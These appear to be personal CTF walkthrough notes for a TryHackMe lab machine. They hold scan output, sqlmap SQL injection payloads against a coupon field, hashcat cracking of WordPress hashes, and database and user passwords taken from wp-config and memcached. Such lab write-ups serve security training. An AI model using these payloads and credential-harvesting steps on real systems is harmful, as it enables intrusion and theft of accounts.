<code>
https://tryhackme.com/r/room/wekorra

### Enumeration

┌──(duke㉿kali)-[~/Documents/THM_wekor]
└─$ nmap  -A  -Pn  10.10.197.97
Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-17 02:47 CDT
Nmap scan report for 10.10.197.97
Host is up (0.035s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:c3:ce:af:07:fa:e2:8e:29:04:e4:cd:14:6a:21:b5 (RSA)
|   256 4d:99:b5:68:af:bb:4e:66:ce:72:70:e6:e3:f8:96:a4 (ECDSA)
|_  256 0d:e5:7d:e8:1a:12:c0:dd:b7:66:5e:98:34:55:59:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 9 disallowed entries 
| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot 
|_/comingreallysoon /interesting
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.32 seconds

#### robots.txt
User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting

on /comingreallysoon found
Welcome Dear Client! We've setup our latest website on /it-next, Please go check it out! If you have any comments or suggestions, please tweet them to @faketwitteraccount! Thanks a lot ! 

http://wekor.thm/it-next/


┌──(duke㉿kali)-[~/Documents/THM_wekor]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://wekor.thm/it-next -x .php, .txt, .html 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://wekor.thm/it-next
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,
[+] Timeout:                 10s
===============================================================
2024/05/17 03:58:06 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://wekor.thm/it-next/images/]
/index.php            (Status: 200) [Size: 66938]                                     
/contact.php          (Status: 500) [Size: 0]                                         
/css                  (Status: 301) [Size: 312] [--> http://wekor.thm/it-next/css/]   
/js                   (Status: 301) [Size: 311] [--> http://wekor.thm/it-next/js/]    
/config.php           (Status: 200) [Size: 0]                                         
/fonts                (Status: 301) [Size: 314] [--> http://wekor.thm/it-next/fonts/] 
/revolution           (Status: 301) [Size: 319] [--> http://wekor.thm/it-next/revolution/]
                                                                                          
===============================================================
2024/05/17 04:41:56 Finished
===============================================================

### sqlmap  -r req_it_cart.txt --dbs --level 5            


[06:23:37] [WARNING] parameter 'Referer' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 19054 HTTP(s) requests:
---
Parameter: coupon_code (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: coupon_code=gsdf' AND 7325=(SELECT (CASE WHEN (7325=7325) THEN 7325 ELSE (SELECT 6507 UNION SELECT 3254) END))-- -&apply_coupon=Apply Coupon

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: coupon_code=gsdf' AND GTID_SUBSET(CONCAT(0x716a627071,(SELECT (ELT(1291=1291,1))),0x717a6b6a71),1291)-- KhIi&apply_coupon=Apply Coupon

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: coupon_code=gsdf' AND (SELECT 2208 FROM (SELECT(SLEEP(5)))jnwK)-- uaPj&apply_coupon=Apply Coupon

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: coupon_code=gsdf' UNION ALL SELECT CONCAT(0x716a627071,0x50504e4769727562416743554d6878484a754b6e6c7a4b487273476457645253516a6e4975686863,0x717a6b6a71),NULL,NULL-- -&apply_coupon=Apply Coupon
---
[06:23:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[06:23:38] [INFO] fetching database names
available databases [6]:
[*] coupons
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress


### http://site.wekor.thm/wordpress/
http://site.wekor.thm/wordpress,$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B.,admin@wekor.thm,admin,0,admin,admin,2021-01-21
$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. - Possible algorithms: phpass, phpBB3 (MD5), Joomla >= 2.5.18 (MD5), WordPress (MD5)

──(duke㉿kali)-[~/Documents/THM_wekor]
└─$ wpscan --url http://site.wekor.thm/wordpress

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://site.wekor.thm/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)



Session..........: hashcat                                
Status...........: Quit
Hash.Mode........: 400 (phpass)
Hash.Target......: $P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B.
Time.Started.....: Fri May 17 07:22:35 2024 (23 secs)
Time.Estimated...: Fri May 17 08:16:09 2024 (53 mins, 11 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (../../rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     4463 H/s (6.98ms) @ Accel:64 Loops:1024 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests
Progress.........: 102912/14344385 (0.72%)
Rejected.........: 0/102912 (0.00%)
Restore.Point....: 102912/14344385 (0.72%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3072-4096
Candidate.Engine.: Device Generator
Candidates.#1....: GANTENG -> 4everloved

Started: Fri May 17 07:22:19 2024
Stopped: Fri May 17 07:22:59 2024


**  http://site.wekor.thm/wordpress/wp-login.php

┌ (duke㉿kali)- [~/Documents/THM_wekor]
└─ $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://site.wekor.thm/wordpress 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://site.wekor.thm/wordpress
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              ,php
[+] Timeout:                 10s
===============================================================
2024/05/20 02:48:30 Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 331] [--> http://site.wekor.thm/wordpress/wp-content/]
/index.php            (Status: 301) [Size: 0] [--> http://site.wekor.thm/wordpress/]             
/wp-login.php         (Status: 200) [Size: 7896]                                                 
/wp-includes          (Status: 301) [Size: 332] [--> http://site.wekor.thm/wordpress/wp-includes/]
/wp-trackback.php     (Status: 200) [Size: 135]                                                   
/wp-admin             (Status: 301) [Size: 329] [--> http://site.wekor.thm/wordpress/wp-admin/]   
/xmlrpc.php           (Status: 405) [Size: 42]                                                    
/wp-signup.php        (Status: 302) [Size: 0] [--> http://site.wekor.thm/wordpress/wp-login.php?action=register]
                                                                                                                
┌──(duke㉿kali)-[~/Documents/THM_wekor]
└─$ hashcat -m 400 eagle.hash ../../rockyou.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-9700 CPU @ 3.00GHz, 6770/13604 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: ../../rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

### $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/:xxxxxx                 
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 400 (phpass)
Hash.Target......: $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/
Time.Started.....: Mon May 20 04:33:23 2024 (1 sec)
Time.Estimated...: Mon May 20 04:33:24 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (../../rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2155 H/s (6.90ms) @ Accel:256 Loops:128 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1024/14344385 (0.01%)
Rejected.........: 0/1024 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:8064-8192
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> bethany

Started: Mon May 20 04:33:22 2024
Stopped: Mon May 20 04:33:25 2024


 ### soccer13

╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-rw-rw- 1 www-data www-data 3192 Jan 21  2021 /var/www/html/site.wekor.thm/wordpress/wp-config.php               
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'root' );
define( 'DB_PASSWORD', 'root123@#59' );
define( 'DB_HOST', 'localhost' );

www-data@osboxes:/tmp$ telnet localhost 11211
telnet localhost 11211
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
version
version
VERSION 1.4.25 Ubuntu
id
id
ERROR
get username 
get username
VALUE username 0 4
Orka
END
value password
value password
ERROR
get password
get password
VALUE password 0 15
## OrkAiSC00L24/7$


Orka@osboxes:~$ sudo -l
sudo -l
[sudo] password for Orka: 1a26a6d51c0172400add0e297608dec6

Sorry, try again.
[sudo] password for Orka: OrkAiSC00L24/7$

Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin
Orka@osboxes:~$ 


